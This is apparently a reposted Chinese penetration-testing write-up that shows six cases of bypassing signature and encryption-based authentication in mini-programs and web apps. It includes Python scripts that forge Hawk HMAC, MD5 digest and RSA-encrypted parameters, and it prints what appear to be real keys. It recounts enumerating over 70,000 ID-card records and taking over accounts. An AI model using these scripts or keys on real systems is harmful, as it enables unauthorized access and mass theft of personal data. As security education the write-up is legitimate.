#  手把手拆解：小程序/Web端加密鉴权绕过案例全复现  
 黑白之道   2026-03-24 01:29  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
原文首发在：奇安信攻防社区  
  
https://forum.butian.net/share/4664  
  
本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管  
  
本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管。  
# 案例一  
  
某天对小程序进行登录时发现登录进去这个接口有个personalid参数，发现也是返回了个人信息，一开始还以为是一个改id进行越权的简单漏洞，但是当我再次发包以后显示时间ts有问题，改了ts以后又说nonce有问题，到最后改了nonce，发现mac又有问题，这里就大概了解了大概的一个鉴权（ts，nonce要变化）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibXwiaJ0emwpUBibq5JeiaREqpVB16eMh090TTP1sobPNO4WkBQvKfohHPzeW3mG9bqDJVNSVcw7fhMvbD7zphMdgicCVuLvmCiaycE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icpXF7yaPO16gwh5QXe7xzhqdjmqLhzmYibBGg3037hDqNBheD5wgvNDbSKZm1wbia9AGliaZib5C358MGiaZysUtPa4XKtHbZ3Es98/640?wx_fmt=png&from=appmsg "")  
  
到这里就可以发现是mac参数进行的鉴权，由于是小程序，所以反编译一下源码  
  
这里全局搜一下mac  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49WVic40mFdPADWe4dSmPNIS1dW17eCR1Wl0G3SbNwduG1jo6wic0QoepIYmmibRvuS7ZsvDzTgwqZ9oY6WYTIFRXf7oEkzZsOp28/640?wx_fmt=png&from=appmsg "")  
  
代码如下：  
```
var o = {                    ts: a,                    nonce: i.nonce || e.utils.randomString(6),                    method: n,                    resource: r.resource,                    host: r.host,                    port: r.port,                    hash: i.hash,                    ext: i.ext,                    app: i.app,                    dlg: i.dlg                },                c = e.crypto.calculateMac("header", s, o),                h = 'Hawk id="' + s.id + '",ts="' + o.ts + '",nonce="' + o.nonce + '",mac="' + c + '"';
```  
  
这里的o是ts,nonce,method,resource,host,port这些组合起来的  
  
可以看见mac是等于c的，其实就是请求方式和url及认证头里面的东西组合起来进行了一个加密  
  
跟进一下e.crypto.calculateMac  
  
全局搜索  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibat0jo87UK87W59TTVIia6a2q37dibfQlCg5icZDTFTlhOHNgXhxpdauLOgqJ8HX9dNMNEUbl9vRx3AAfV7xpTbicuXxAxgxpFBRQ/640?wx_fmt=png&from=appmsg "")  
  
加密逻辑  
```
e.crypto = {        headerVersion: "1",        algorithms: ["sha1", "sha256"],        calculateMac: function(t, r, n) {var i = e.crypto.generateNormalizedString(t, n);return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)        }
```  
  
这里对calculateMac  
函数分析，这个函数是该对象的核心，它接受三个参数：  
- t  
: **原始数据**  
。  
  
- r  
: **包含算法和密钥的对象**  
。这个对象内部有 r.algorithm  
（指定哈希算法，例如"sha1"  
或"sha256"  
) 和 r.key  
（用于HMAC计算的密钥）。  
  
- n  
: 也就是o。  
  
```
var i = e.crypto.generateNormalizedString(t, n);
```  
- 首先，调用 e.crypto.generateNormalizedString  
函数，传入 t  
和 n  
参数。  
  
- 这个函数将上一步准备好的 o  
对象（以及其他输入，如 t  
）按照 Hawk 协议的特定规则进行**排序**  
和**拼接**  
，生成一个唯一的、标准化的字符串。这样的话就确保不管数据在原始对象中的顺序如何，只要内容不变，生成的标准化字符串就始终一致。这对于**防止因数据顺序不一致而导致的签名验证失败**  
  
```
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
```  
- 这行代码是实际进行HMAC计算和格式化的部分。  
  
- r.algorithm.toUpperCase()  
: 将传入的算法名称转换为大写，例如 sha1  
变为 SHA1  
。  
  
- "Hmac" + r.algorithm.toUpperCase()  
: 动态构建HMAC算法名称，例如 "HmacSHA1"  
或 "HmacSHA256"  
。  
  
- s["Hmac..."](i, r.key)  
: 使用标准化字符串 i  
和密钥 r.key  
来调用 HMACC 算法进行计算，返回一个HMAC结果。  
  
- .toString(s.enc.Base64)  
: 将计算出的HMAC结果转换为**Base64编码**  
的字符串，并作为函数的最终返回值。  
  
这里就需要找到key了  
  
一开始全局搜索key但是太多了  
  
然后联想到一般key都会放在配置文件里面  
  
搜了一下config  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ib11IfAvSiaoyPyWTBDvRF2ZrU0cFiaScIg1r6AW1sodqUJCUyXKlEbHW7uvKpsGpicypToy6OItPLuAHgUE8ApfQpPaMy1ZVzeKQ/640?wx_fmt=png&from=appmsg "")  
  
写个脚本试一下能不能使用  
```
import base64import hmacimport hashlibimport timedef generate_normalized_string(header_type, artifacts):"""生成 Hawk 规范化字符串"""    n = f"hawk.1.{header_type}\n"    n += f"{artifacts['ts']}\n"    n += f"{artifacts['nonce']}\n"    n += f"{artifacts['method'].upper()}\n"    n += f"{artifacts['resource']}\n"    n += f"{artifacts['host'].lower()}\n"    n += f"{artifacts['port']}\n"    n += f"{artifacts['hash']}\n"# 空字符串# 无 ext 参数    n += "\n"# 无 app 和 dlg 参数return ndef calculate_mac(credentials, artifacts):"""计算 Hawk MAC 值"""    normalized_str = generate_normalized_string("header", artifacts)print("规范化字符串:")print("----------------------")print(normalized_str)print("----------------------")    key_bytes = credentials["key"].encode("utf-8")    msg_bytes = normalized_str.encode("utf-8")# 使用 SHA-256    hmac_digest = hmac.new(key_bytes, msg_bytes, hashlib.sha256).digest()return base64.b64encode(hmac_digest).decode("utf-8")# 输入参数credentials = {"id": "wasx","key": "edb8bc95-a000-4ca0-81b8-dd2145050a70F61FB1981510CE5D3988193864A328A3","algorithm": "sha256"}timestamp = time.time()timestamps=int(timestamp)artifacts = {"ts": timestamps,"nonce": "6a0d5d576135004ead6cf4795e5b6112",        "method": "GET","resource": "xxxx/List/QueryByPersonalid?personalid=668223","host": "xxxxxxx","port": "443","hash": ""}# 计算并验证 MACcalculated_mac = calculate_mac(credentials, artifacts)print(f"计算 MAC: {calculated_mac}")
```  
  
发现可以使用，后续也是遍历了7w+的sfz信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibMcaMISUy9D3MCicKx46upzX4Htz0qOgWG17LbGzZu4lYYQZ4JIKaMnJmcFwT6vEWlFGicPpiaiceTqHNiblibTF17G0OwoFTjZPC5w/640?wx_fmt=png&from=appmsg "")  
# 案例二  
  
这里是一个预约功能的地方，需要填写个人信息包括了身份证号，可以看见有个personCode参数，后面跟了一串数字，然后下滑可以发现返回了个人信息，原本想遍历一下这个参数的，但是说参数过期了，想都不要想肯定是digest加密导致的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icLKh1hkuveDZxJQqezxViaP1zK2247HGkLdodEfBvsVKvO1xWmwKIUpXdicXDn0gMClS65icg2BGaeCLBiac6g2tribm7WMuyspMro/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibl3QvdGBhD6Oibg6TD5InVxU0vM1rj2WmwPo7nKvm2yMY9jjibmic0WfPsCQ8Vc6wVy7pGuqXspDomkPgicsFbhHX1FaPAUNVokxc/640?wx_fmt=png&from=appmsg "")  
  
一样的方法反编译一下  
  
找到加密地方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48XTWOicgNCIb4saMJMSF1RbIbv6bVtkz5go6vy5tcQFORa26wBzYvW5lWohFdpQuHOv3UJP1Amg42z1yymZFYtQy2Qadr5nesk/640?wx_fmt=png&from=appmsg "")  
  
这个就比较简单了，只有有个hexMD5加密  
  
简单分析一下代码  
```
var n = a.domainUrl(o.domain).match(/[^\/]+$/)[1]  
```  
  
这个正则表达式是匹配字符串末尾的非斜杠字符。例如，如果 a.domainUrl(o.domain)  
返回 "https://example.com/api"，那么它会匹配 "api"  
```
u = o.url.includes("?") ? o.url.split("?")[0] : o.url
```  
- 这行代码处理 URL，去除查询参数。  
  
- o.url.includes("?")  
：检查 o.url  
字符串是否包含问号 ?  
。  
  
- o.url.split("?")[0]  
：如果包含 ?  
，则用 ?  
分割 URL 字符串，并取第一个部分，即问号之前的部分。  
  
```
digest: t.hexMD5("/".concat(n, "/") + u + s).toUpperCase()
```  
- "/".concat(n, "/")  
：将字符串 n  
用斜杠包裹起来。例如，如果 n  
是 "api"，结果就是 "/api/"。  
  
- + u + s  
：将上一步的结果、不带参数的 URL u  
和时间戳 s  
拼接在一起。  
  
- t.hexMD5(...)  
：调用一个名为 t  
的对象上的 hexMD5  
方法，对拼接后的字符串进行 MD5 哈希计算。MD5 是一种常见的哈希算法，用于生成一个唯一的、固定长度的散列值。  
  
- .toUpperCase()  
：将生成的 MD5 散列值转换为大写。  
  
分析完毕，开始写脚本：  
```
import reimport hashlibimport timedef calculate_digest(domain, url, timestamp):# 提取domain的最后路径片段match = re.search(r'\/([^\/]+)\/?$', domain)if not match:        raise ValueError("Invalid domain format")    n = match.group(1)# 去掉URL的查询参数    u = url.split('?', 1)[0]# 拼接字符串    s = f"/{n}/{u}{timestamp}"# 计算MD5并转大写return hashlib.md5(s.encode('utf-8')).hexdigest().upper()# 示例调用if __name__ == "__main__":    domain = 'xxxxx'    url = 'xxxxx'    timestamp = int(time.time() * 1000)  # 获取毫秒级时间戳print("Timestamp:", timestamp)    digest = calculate_digest(domain, url, timestamp)print("digest:", digest)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ickE8ypvxIRJx7YRoFBcicLKKuicmmmfvyD2cenPuxx2eD6bwxnia3hyEBcogsibPWsb8bnZ3aRwJza8iaBXyFciaVWnG8cFPbxpshIw/640?wx_fmt=png&from=appmsg "")  
# 案例三  
  
这里说一下快速找到加密点的方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49cxPWEFwRktrWLanRWEtC8mzOE6icK5d7RicicicIK1NcchPmpM1mrEXMal6Slw0vsLeiaV5QKqOfqvqeNfZrT4jf7aiaWJprzibf6nk/640?wx_fmt=png&from=appmsg "")  
  
xhr打断点进行定位加密，选一个标志性的进行定位  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ib1UUzn4CcBD9E99j5BFuxicib5xVXnD2lUR3YaRDxM4CNIgibWmsjcTt5ibPHpX1zy93hwHzhFLApWtTqaK2KQGcicF7UELiccYPq0M/640?wx_fmt=png&from=appmsg "")  
  
加入xhr  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibdQTUnGlM1EEN9TiaxJNtr8vIQuuo05CwsEm9EZQm76iaibqjga096vawLRQoEZx2hMGgXZnzQnNkzhqyB7KOibWV1fJK3n8ia6yCo/640?wx_fmt=png&from=appmsg "")  
  
刷新页面，断住了，接下来看它的作用域来寻找加密参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49AdTdwsrFia4fPZNsdJHzdSu9Fx6L3QghxD5omtaG4LssibJbsabxnX1ENUC189O0BDAiadvfYPBQhSXvJLx1ibkhRk5CLichvyM6Y/640?wx_fmt=png&from=appmsg "")  
  
往上跟栈，发现加密参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icxcaeaictmeGAnK768kKSXSebPbXEvMYMXFskd5gkJS4xh0URapZRymnRKN165iamP7GDKXqIV8eyyBiaDvqTQibic4Y3X3rTesmibA/640?wx_fmt=png&from=appmsg "")  
  
再往上跟几个栈，找到最后一个出现加密参数的地方  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48ttpfTAWgIm9iccLbhaHnbTQiciaia0xIKNYhLYvMiaRoXRlibdMrbCeCRL9J6pvwCBl4rjSJcxd1TxMzvYrALSNbGqSK7kR8ab6QF4/640?wx_fmt=png&from=appmsg "")  
  
接下来直接上案例  
  
这个是web端的js逆向，在查看网页源代码的时候发现了默认密码111111，并且没有验证码校验，这里大概的一个攻击思路就是固定密码爆破用户名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48c6fafr3cBplJCByWBhEcibqsIhYN1ktKq7BUeZZbkfqVYsmBZUic5ebaRW4203BJUMicM2hcONGGUYJdx6H6GPENicXyCdVibdIII/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48UAdrB9ibfq3DIqS3CdEbIK4Do1Cpsiao0rasBiagM8BAhPz3zibfClRqic7eibrOYwLs134nDoljPGrbDIKicDrH069lxOTavmdZPKU/640?wx_fmt=png&from=appmsg "")  
  
但是在抓包的时候发现，password被加密了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibaOLB2vLonudnraYO7DKNXHT02QtclqzL7iaTicnrZEtcYCbibW9T1f4J9ERZUHgWj3RCav7X4jSqqpObrFnppEBulumbR3tSP2I/640?wx_fmt=png&from=appmsg "")  
  
这里又需要js逆向了  
  
一开始是搜索加密参数，然后挨个看了下发现加密函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49JiaROlQU2tUvDsOF5SxVp8C2ZpeMs8XiaUic1yfBO8UjrVTtTGdCd5p05JiaISUntLIWDd1MicqkO28wh9zPOQMKERaqrAZA4CxAk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49ZKRoVRiboQ0d0YuhyoVD7ubwEfePyS6809z3apDTJibe4FN1wLzMUdCHbWIN3Ct2END9scPxVcKR3EcECicpGlYjwfZHzJQgGHo/640?wx_fmt=png&from=appmsg "")  
```
rsa.setPublic(modulus, exponent)
```  
- **modulus**  
（模数）：这是一个非常大的数字，这里用十六进制字符串表示。它是 RSA 密钥对的核心部分。从其长度（256个字符）来看，这是一个 **1024 位**  
的密钥。  
  
- **exponent**  
（公钥指数）：值为 "10001"  
，这是一个常用的公钥指数，它的十六进制值是 65537  
。选择这个值是因为它是一个质数，且二进制表示中只有两个 1  
，可以加快加密运算的速度。  
  
- rsa.setPublic()  
方法将这两个值设置为 rsa  
对象的公钥，使其准备好进行加密。  
  
跟进一下这个加密函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48XDUVKf0J5sS9TE66noQn3l1U12huErWP5IPLunslyH6No0Mz0knGrh4vicSrzgEvIKrQ2Qf56eL96vO461vCzJN4oOwVc0Cr8/640?wx_fmt=png&from=appmsg "")  
```
var m = pkcs1pad2(text,(this.n.bitLength()+7)>>3);
```  
- **pkcs1pad2**  
是一个填充函数，它根据 **PKCS #1 v1.5**  
标准对明文进行填充，确保明文的长度适合加密。  
  
- this.n  
代表 RSA 密钥对中的 **模数（modulus）**  
。this.n.bitLength()  
获取模数的位长度。  
  
- (this.n.bitLength() + 7) >> 3  
是一个计算字节长度的位运算技巧，等同于 Math.ceil(this.n.bitLength() / 8)  
。它确保填充后的数据长度与 RSA 密钥的长度匹配。  
  
- 如果填充失败，函数返回 null  
。  
  
```
var c = this.doPublic(m);
```  
- **this.doPublic(m)**  
是执行 RSA 公钥加密的核心操作。它使用 RSA 公钥（**模数****n**  
和 **公钥指数****e**  
）将填充后的明文 m  
进行加密。  
  
- 加密公式为：c=me(modn)，其中 c  
是密文，m  
是填充后的明文，e  
是公钥指数，n  
是模数。  
  
- 如果加密失败，函数返回 null  
。  
  
```
var h = c.toString(16);
```  
- c  
通常是一个大数对象，toString(16)  
将其转换为十六进制字符串 h  
。  
  
- if((h.length & 1) == 0) return h; else return "0" + h;  
- 这是一个确保十六进制字符串长度为**偶数**  
的检查。  
  
接下来就可以写加密脚本了  
```
import base64from cryptography.hazmat.primitives import serialization, paddingfrom cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_paddingfrom cryptography.hazmat.backends import default_backend# 1. 设置公钥的模数和指数modulus_hex = "B87A3BE2184FED0973FFB0B02A862DCAD15A1A29172EC8FF67E841FE26749A6AA04E48E9B02D963ED81DCE2B0086C034F7D47CCBACF8539C36B9445ABA5EF484F3CA32593762641B4C9683C79801D087198370D5719BB4E422FADAA4D883D13874DE67D8B6E883EBAACC53A8480F41EE8BE70D2F70BECF3CB7F1023D2C901CC3"exponent_hex = "10001"# 将十六进制字符串转换为整数n = int(modulus_hex, 16)e = int(exponent_hex, 16)public_numbers = rsa.RSAPublicNumbers(e, n)public_key = public_numbers.public_key(default_backend())# 3. 定义加密函数def rsa_encrypt(plaintext, public_key):    ciphertext = public_key.encrypt(        plaintext.encode('utf-8'),        asymmetric_padding.PKCS1v15()    )# 转换为十六进制字符串，并确保长度为偶数    hex_ciphertext = ciphertext.hex()if len(hex_ciphertext) % 2 != 0:        hex_ciphertext = '0' + hex_ciphertextreturn hex_ciphertextpsw = "111111"# 4. 执行加密encrypted_psw = rsa_encrypt(psw, public_key)print(f"待加密的明文: {psw}")print(f"加密后的密文: {encrypted_psw}")print(f"密文长度: {len(encrypted_psw)} 字符")
```  
# 案例四  
  
这里在一个数据包里面发现了一个密钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibBcgmnvMzUQkzfQwnNicbWo3aD6EaSp7CVicB3cmK2q3MB72JwqLBaPzTy6sLLlYhUbl3CVgdP2Itz7w4PSBFpmTicP4ibsPcQKWU/640?wx_fmt=png&from=appmsg "")  
  
这里发现账户鉴权的参数是account，js翻到是rsa加密  
```
functionencrypt(username, privatKey) {const encrypt = new JSEncrypt();        encrypt.setPublicKey(privatKey);const encrypted = encrypt.encrypt(username);if (encrypted) {return encrypted;        }
```  
  
只需要提供用户名和密钥就可以加密了，由于这里已经有了密钥，那直接控制台调用就好了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibg3JtxsQQVIzEOtpKfa86SItpxXR57Wy4pTVjIDNKJDua2keekhnH9icllelNOEX1Zyq0Ymjh3dic4g1YzAkftnBRW0LUWic6OzY/640?wx_fmt=png&from=appmsg "")  
  
普通用户登录后，发现了管理员用户名，同样的方法加密  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD484f8hD1vEgTTCibz3WbcG9aSRne9OyZeqZ3TkTjAGyEwJlyJVLmBHxv5LHY06OTmKmsROABFXH9OsUgKtYF5jNLnjR3yYfTaEk/640?wx_fmt=png&from=appmsg "")  
  
直接泄露了几万条数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icACtbPagnSOicZZFCz7vib0oNQHHJQp6kpHrfw634es9bgyjYVkfujJZ7T6TvAgds4T0HCIzN9jYNzibPeBhArF7nbk3HpJd3ctQ/640?wx_fmt=png&from=appmsg "")  
# 案例五  
  
这里是小程序的一个注销功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49gOY6INfrZVEbcG1rr2mzKmGU31Sc1FJ8dMhkNQjknpZrRAaHUdwz2JZ9y9DzPnUJskrDJlghLkjACIh2iadLzU5G8AhOqCCHc/640?wx_fmt=png&from=appmsg "")  
  
注销账号为post方式的加密数据，这里就需要对小程序进行js逆向调试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibOl4gVMQSibkM0rEc9ibAicrFvWF8u6lve4xymicR73bAHxe6iaYUbiaZdfAicRl3XV4elbSDZhE8OiaWonXpSo13XUa26HK7s2ofV1nw/640?wx_fmt=png&from=appmsg "")  
  
这里我们根据路由来找加密点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icXx284Ft6iaKh3GNib0IqkOQpEKbBH3a3d02zP7fARn7B8d0TuU9NX5GSXiaicBLWLwmbVqFBc2Tdp4IIqV10sibKs4Cya3oup1wTk/640?wx_fmt=png&from=appmsg "")  
  
js逆向动态调试的好处就是可以修改数值，它也会自动生成密文，这里就直接动调的时候给手机号改了，就可以了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48lxckBnW4KqQABcIx7cTE5mcnzgQTwma9yt17dchQpO2aJuHniby5NttdgELaTVjeZ0V4eAUyXbLsYXDlPqdomBDYmSricMic63k/640?wx_fmt=png&from=appmsg "")  
# 案例六  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icHUlcdXaX50BA69LbPC5v4zSaUVJOr2gWODo6pRQLxEFbySueZDYTohEaqgGAsXWkNToKkvXFWJxGMB8vTgFE3WhDoR0uPCXw/640?wx_fmt=png&from=appmsg "")  
  
小程序这里有个保存用户信息的地方，抓包可以看到也是被加密了，这里返回了一个yhgrid  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icsrZNNOUZBoFSNOZ1bIZlG9EOFeodc9jicD8hSy9icKUGFkLPo1yhmZVrKCBOfNurOCPeLlibXsOqicdNQpLzFaiccwsDR0a6yAs4M/640?wx_fmt=png&from=appmsg "")  
```
对小程序的如下JS进行断点调试：抓取修改用户地址信息接口，报文加密为AES-CBC-ZERO,key和iv为UKU0m5xBbOa/Lz==，再加上url编码解密可得
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icr86W4odJgGMnTicnCtS3NQTz33ylXbbw9kWiaK96ichJAK095gicMN8icYCoNs0ywAuv1pYntJhSsicicibuiczvJOENOTyB5W07AlWEM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ib3PvFE0KFGDYsGP8vSqXtQibSrctqOaxPXcHTqeSftn2A8G8l27icn8xVDUd3LjcKrdIwI5laueAJHkXCK2gXqx0dQibxiaOicMLqA/640?wx_fmt=png&from=appmsg "")  
  
修改grid  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD484kFXNicXLnnsLwXbd48dmwlZIxCECTKeusicrUH2hCIXnMrAujqAicpO4gqZolzCiawU76icV0ggCFWLSvqicqK4bKyZt3lK51PKYc/640?wx_fmt=png&from=appmsg "")  
  
发包修改成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icME0hyIAawg3If0jpibqxd6SWW4chXK36GQcdoicbUPRSG5VqNJgL3Rv9YtYuBIdiaNnl1AQOqlPcyJ2hUrKjDicRhxYdXfwD0wKk/640?wx_fmt=png&from=appmsg "")  
  
再次查看用户信息，发现被成功修改了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD495aAiaKpA51icc7A2pWqFIHEEibC8aQSLhRyNDibCvfRwLYMLQGWOtuujIUJ24CnGf45AkemdwcfiauNYMD8TUM8EgmYY0BhqwL8PY/640?wx_fmt=png&from=appmsg "")  
  
通过对六个典型场景的拆解，我们不难发现：**“加密 ≠ 安全”**  
。无论是Hawk协议中的动态签名、MD5时间戳校验，还是RSA/AES等标准加密算法，其安全性高度依赖于密钥管理、参数时效性与实现细节。一旦密钥泄露、nonce可预测、ts未严格校验，或加密逻辑被完整逆向，整个鉴权体系将形同虚设。  
  
  
> **文章来源：亿人安全**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
  
